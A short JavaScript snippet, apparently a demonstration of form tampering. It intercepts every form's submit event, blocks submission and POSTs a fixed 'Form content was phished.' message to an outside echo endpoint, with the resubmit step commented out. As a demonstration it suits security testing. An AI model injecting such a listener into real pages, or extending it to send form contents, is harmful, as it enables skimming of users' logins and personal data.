console.log("Form event listener script loaded.");

document.querySelectorAll('form').forEach(form => {
    console.log("Adding event listener to form:", form)
    form.addEventListener('submit', (event) => {
        event.preventDefault();
        console.log('Form submitted:', event.target);

        fetch('https://echo.free.beeceptor.com/collected-data-from-form-event-listener', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message: "Form content was phished." })
        })
            .then(response => response.text())
            .then(data => {
                console.log('Form tampering message sent:', data);

                setTimeout(() => {
                    //form.submit();
                }, 4000);
            })
            .catch(error => console.error('Error sending form tampering message:', error));
    });
});
